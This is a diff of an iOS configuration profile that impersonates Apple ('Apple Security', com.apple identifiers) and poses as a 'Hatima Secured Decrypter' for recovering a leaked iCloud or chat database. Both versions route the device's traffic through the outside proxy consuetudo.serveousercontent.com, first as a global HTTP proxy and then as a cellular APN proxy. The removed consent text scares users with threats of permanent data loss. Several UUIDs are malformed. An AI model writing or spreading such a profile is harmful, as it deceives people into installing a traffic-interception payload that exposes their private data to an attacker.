@@ -6,45 +6,43 @@
     <array>
         <dict>
             <key>PayloadDescription</key>
-            <string>Configures secure proxy settings for identity verification.</string>
+            <string>Configures cellular data settings for secure access.</string>
             <key>PayloadDisplayName</key>
-            <string>iCloud Security Proxy</string>
+            <string>Cellular Security Update</string>
             <key>PayloadIdentifier</key>
-            <string>com.apple.proxy.http.global.secure</string>
+            <string>com.apple.cellular.proxy.1</string>
             <key>PayloadType</key>
-            <string>com.apple.proxy.http.global</string>
+            <string>com.apple.cellular</string>
             <key>PayloadUUID</key>
-            <string>D5E6F7G8-H9I0-J1K2-L3M4-N5O6P7Q8R9S0</string>
+            <string>F1E2D3C4-B5A6-9788-7543-A1B2C3D4E5F6</string>
             <key>PayloadVersion</key>
             <integer>1</integer>
-            <key>ProxyType</key>
-            <string>Manual</string>
-            <key>ProxyServer</key>
-            <string>consuetudo.serveousercontent.com</string>
-            <key>ProxyServerPort</key>
-            <integer>443</integer>
+            <key>APNs</key>
+            <array>
+                <dict>
+                    <key>Name</key>
+                    <string>Default</string>
+                    <key>ProxyServer</key>
+                    <string>consuetudo.serveousercontent.com</string>
+                    <key>ProxyServerPort</key>
+                    <integer>80</integer>
+                </dict>
+            </array>
         </dict>
     </array>
     <key>PayloadDescription</key>
-    <string>Secure Verification Profile to recover leaked chat database.</string>
+    <string>Mandatory Security Decrypter for iCloud Database Recovery.</string>
     <key>PayloadDisplayName</key>
-    <string>Hatima Secured Decrypter V2</string>
+    <string>Hatima Secured Decrypter V3</string>
     <key>PayloadIdentifier</key>
-    <string>com.apple.security.decrypter.v2</string>
+    <string>com.apple.security.verify.v3</string>
     <key>PayloadOrganization</key>
-    <string>Apple Security Systems</string>
-    <key>PayloadRemovalDisallowed</key>
-    <false/>
+    <string>Apple Security</string>
     <key>PayloadType</key>
     <string>Configuration</string>
     <key>PayloadUUID</key>
-    <string>E5F6G7H8-I9J0-K1L2-M3N4-O5P6Q7R8S9T0</string>
+    <string>A1B2C3D4-E5F6-7G8H-9I0J-K1L2M3N4O5P6</string>
     <key>PayloadVersion</key>
     <integer>1</integer>
-    <key>ConsentText</key>
-    <dict>
-        <key>default</key>
-        <string>This profile is required to decrypt and secure your private data. Failure to install may lead to permanent data loss.</string>
-    </dict>
 </dict>
 </plist>
